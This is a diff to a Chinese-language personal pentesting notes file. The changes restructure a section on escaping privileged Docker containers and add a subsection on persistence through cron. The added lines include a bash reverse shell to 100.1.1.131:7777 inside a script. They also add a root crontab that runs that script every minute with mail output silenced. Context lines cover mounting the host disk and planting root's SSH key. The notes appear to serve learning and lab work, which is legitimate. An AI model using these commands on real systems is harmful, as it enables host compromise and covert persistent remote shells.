@@ -379,9 +379,11 @@ docker commit -m "add elasticsearch-head" 10f2daf4ead5 cve-2015-3337_es:v0
 
 ---
 
-## 渗透相关
+## 安全相关
 
-### 反弹 shell 中如何判断自己是否在 docker 容器中
+### Docker逃逸
+
+#### 反弹 shell 中如何判断自己是否在 docker 容器中
 
 - 看当前反弹 shell 的主机名称, 一堆数字字母的则可能是 docker 容器 id
 
@@ -397,7 +399,7 @@ docker commit -m "add elasticsearch-head" 10f2daf4ead5 cve-2015-3337_es:v0
 
 ----
 
-### 反弹shell到特权模式的docker容器后进一步获取宿主机权限
+#### 反弹shell到特权模式的docker容器后进一步获取宿主机权限
 
 在判断当前反弹shell位置为docker后可以尝试查看下系统中的所有银盘分区表信息
 
@@ -428,7 +430,9 @@ mount /dev/sda5 /joker
 
 ![image-20230619101649612](http://cdn.ayusummer233.top/DailyNotes/202306191016670.png)
 
-> 很多博客有提到可以写计划任务反弹 shell , 但是我写了计划任务后并不能弹过来, 因此放弃了反弹 shell
+----
+
+##### 写公钥
 
 可以尝试写 root 账户的公钥
 
@@ -461,6 +465,33 @@ ssh -i id_rsa root@xxx
 ```
 
 ![image-20230619103459517](http://cdn.ayusummer233.top/DailyNotes/202306191034575.png)
+
+---
+
+##### 写定时任务
+
+
+ubuntu 默认没有 MTA, 因此执行定时任务可能会报这样的错:
+
+![image-20230626075128404](http://cdn.ayusummer233.top/DailyNotes/202306260751798.png)
+
+所以需要在定时任务中第一行写上 `MAILTO=""` 以禁用邮件输出
+
+此外直接写 `bash -i >& /dev/tcp/100.1.1.131/7777  0>&1` 到定时任务中不一定行得通, 可以写个脚本, 然后定时任务调脚本执行, 比如:
+
+`test.sh`:
+
+```sh
+#!/bin/bash
+bash -i >& /dev/tcp/100.1.1.131/7777  0>&1
+```
+
+`/var/spool/cron/crontabs/root`:
+
+```
+MAILTO=""
+* * * * * /bin/bash test.sh
+```
 
 ---
 
